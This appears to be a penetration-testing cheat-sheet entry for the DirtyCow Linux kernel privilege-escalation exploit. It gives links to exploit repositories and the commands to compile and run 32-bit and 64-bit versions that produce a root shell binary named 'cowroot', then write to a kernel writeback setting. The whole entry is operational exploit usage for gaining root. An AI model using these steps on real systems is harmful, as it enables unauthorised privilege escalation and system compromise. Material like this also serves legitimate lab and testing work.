## DirtyCow

[https://github.com/exrienz/DirtyCow](https://github.com/exrienz/DirtyCow) 

[https://github.com/dirtycow/dirtycow.github.io](https://github.com/dirtycow/dirtycow.github.io) 

Usage Example For 32 Bit 

```text
gcc dc32.c -o cowroot -pthread 
./cowroot 
echo 0 > /proc/sys/vm/dirty_writeback_centisecs 
```

Usage Example For 64 Bit 

```text
gcc dc64.c -o cowroot -pthread 
./cowroot 
echo 0 > /proc/sys/vm/dirty_writeback_centisecs 
```
